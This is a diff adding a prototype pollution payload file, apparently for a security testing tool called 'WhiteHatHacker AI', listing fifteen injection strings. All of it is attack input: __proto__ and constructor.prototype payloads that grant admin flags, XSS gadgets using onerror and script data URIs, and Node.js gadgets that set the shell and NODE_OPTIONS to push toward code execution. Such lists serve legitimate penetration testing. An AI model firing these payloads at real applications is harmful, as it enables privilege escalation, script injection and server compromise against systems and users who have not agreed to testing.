@@ -1,0 +1,21 @@
+# ============================================================================
+# WhiteHatHacker AI — Prototype Pollution Payloads (v3.0)
+# Categories: Object key injection, Constructor chain, JSON body
+# Total: 15 payloads
+# ============================================================================
+
+__proto__[isAdmin]=true
+__proto__[role]=admin
+__proto__[constructor][prototype][isAdmin]=true
+constructor[prototype][isAdmin]=true
+constructor.prototype.isAdmin=true
+__proto__.isAdmin=true
+__proto__[status]=200
+__proto__[innerHTML]=<img src=x onerror=alert(1)>
+__proto__[src]=data:text/html,<script>alert(1)</script>
+{"__proto__":{"isAdmin":true}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"__proto__":{"polluted":"yes"}}
+__proto__[__proto__][isAdmin]=true
+__proto__[shell]=node
+__proto__[NODE_OPTIONS]=--require=/proc/self/environ
